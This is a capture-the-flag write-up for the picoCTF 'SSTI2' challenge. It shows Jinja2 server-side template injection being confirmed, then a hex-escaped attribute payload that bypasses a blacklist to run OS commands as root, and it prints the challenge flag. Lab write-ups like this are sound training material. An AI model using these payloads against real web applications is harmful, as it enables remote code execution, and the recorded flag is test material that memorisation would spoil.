# SSTI2

#### Challenge :&#x20;

<figure><img src="../../../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

Let's Try Default `{{7*7}}`  .

<figure><img src="../../../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

It's Confirm `SSTI` is possible .

<figure><img src="../../../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

Let's Use `{{config}}`  because In many template engines (such as Jinja2), `config` refers to an internal object that contains **application configuration details**, including sensitive settings like secret keys, debug flags, and environment variables.

<figure><img src="../../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

100% Confirmed  it's is Jinja2 Template.

<figure><img src="../../../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

Let's Use RCE payloads below:-

```
{{ self.init.globals.builtins.import('os').popen('id').read() }}
```

<figure><img src="../../../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

It's mean some attribute are in `blacklist` let's use some bypassing `SSTI payloads` on github.

<figure><img src="../../../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz" %}

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

<figure><img src="../../../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

boom!! we got RCE and user is `root` .

<figure><img src="../../../../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

I use `ls` command and i got flag in current directory.  &#x20;

<figure><img src="../../../../.gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

Let's `cat` the `flag` and we got flag.

<figure><img src="../../../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

```
Flag: picoCTF{sst1_f1lt3r_byp4ss_afa6aa72}
```
